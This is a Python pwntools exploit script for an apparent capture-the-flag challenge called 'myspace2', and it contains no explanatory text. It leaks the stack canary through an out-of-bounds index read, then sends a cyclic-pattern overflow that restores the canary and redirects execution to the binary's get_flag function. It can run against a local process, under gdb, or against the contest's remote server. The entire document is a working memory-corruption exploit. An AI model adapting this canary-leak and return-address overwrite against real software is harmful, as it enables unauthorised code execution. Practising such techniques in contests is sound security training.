from pwn import *

elf = context.binary = ELF('./myspace2')
context.terminal = ['kitty', '-e']    
gdbscript = '''
b*0x00000000004016bc
c
'''

if args.REMOTE:
    p = remote('myspace2.chal.idek.team',1337)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript=gdbscript)
else:
    p = process(elf.path)


p.recvuntil(b'>> ')
p.sendline(b'3')
p.sendlineafter(b'(0-7): ',b'13')
p.recvuntil(b'Invalid index!\n')
leak = p.recv(8)  # Get exactly 8 bytes
canary = int.from_bytes(leak, 'little')  # Assume little-endian (typical for x86_64)
print(hex(canary))
p.recvuntil(b'>> ')
p.sendline(b'2')
p.sendlineafter(b'(0-7): ',b'7')
p.send(cyclic(48)+ p64(canary)+b'CCCCCCCC'+p64(elf.sym.get_flag)+b'\n')
p.sendline(b'4')

p.interactive()